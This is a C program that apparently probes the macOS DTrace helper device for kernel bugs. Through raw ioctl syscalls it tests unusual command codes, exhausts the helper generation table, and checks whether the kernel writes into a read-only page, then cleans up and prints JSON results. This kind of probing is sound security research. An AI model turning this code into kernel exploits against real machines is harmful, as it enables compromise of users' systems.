#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/dtrace.h>
struct result {uint64_t x0,x1,carry;};
static struct result raw(unsigned fd,uint64_t cmd,uint64_t arg){register uint64_t a __asm__("x0")=fd,b __asm__("x1")=cmd,c __asm__("x2")=arg,n __asm__("x16")=54;uint64_t flags;__asm__ volatile("svc #0x80\n\tcset %x[f],cs":"+r"(a),"+r"(b),"+r"(c),[f]"=r"(flags):"r"(n):"cc","memory");return(struct result){a,b,flags};}

int main(void){int fd=open("/dev/dtracehelper",O_RDWR);if(fd<0)return 2;dof_hdr_t header={0};dof_ioctl_data_t one={.dofiod_count=1};strcpy(one.dofiod_helpers[0].dofhp_mod,"poros-owned-boundary");one.dofiod_helpers[0].dofhp_addr=one.dofiod_helpers[0].dofhp_dof=(uint64_t)&header;uint64_t ptr=(uint64_t)&one;
 struct result high=raw(fd,0x180086804ULL,(uint64_t)&ptr);uint64_t highgen=one.dofiod_helpers[0].dofhp_dof;if(!high.carry){struct result cleanup=raw(fd,0x20006802ULL,highgen);if(cleanup.carry)return 3;one.dofiod_helpers[0].dofhp_dof=(uint64_t)&header;}
 struct result first=raw(fd,0x80086804ULL,(uint64_t)&ptr);if(first.carry)return 4;uint64_t generation=one.dofiod_helpers[0].dofhp_dof;struct result remove=raw(fd,0x20006802ULL,generation);if(remove.carry||generation<1||generation>1024)return 5;
 uint64_t count=1025-generation;dof_ioctl_data_t*full=calloc(1,8+80*count);if(!full)return 6;full->dofiod_count=count;for(uint64_t i=0;i<count;i++)full->dofiod_helpers[i].dofhp_addr=full->dofiod_helpers[i].dofhp_dof=(uint64_t)&header;uint64_t fullptr=(uint64_t)full;struct result fill=raw(fd,0x80086804ULL,(uint64_t)&fullptr);if(fill.carry)return 7;
 unsigned char*readonly=mmap(0,16384,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0);if(readonly==MAP_FAILED)return 8;one.dofiod_helpers[0].dofhp_dof=(uint64_t)&header;memcpy(readonly,&one,sizeof(one));if(mprotect(readonly,16384,PROT_READ))return 9;uint64_t roptr=(uint64_t)readonly;struct result overflow=raw(fd,0x80086804ULL,(uint64_t)&roptr);int unchanged=memcmp(readonly,&one,sizeof(one))==0;
 unsigned cleaned=0;for(uint64_t i=0;i<count;i++){struct result q=raw(fd,0x20006802ULL,full->dofiod_helpers[i].dofhp_dof);if(q.carry)return 10;cleaned++;}free(full);munmap(readonly,16384);close(fd);
 printf("{\"high_command\":{\"x0\":%llu,\"x1\":%llu,\"carry\":%llu},\"initial_next_generation\":%llu,\"fill_count\":%llu,\"overflow_readonly\":{\"x0\":%llu,\"x1\":%llu,\"carry\":%llu,\"record_unchanged\":%s},\"cleanup_count\":%u}\n",(unsigned long long)high.x0,(unsigned long long)high.x1,(unsigned long long)high.carry,(unsigned long long)generation,(unsigned long long)count,(unsigned long long)overflow.x0,(unsigned long long)overflow.x1,(unsigned long long)overflow.carry,unchanged?"true":"false",cleaned);return 0;}
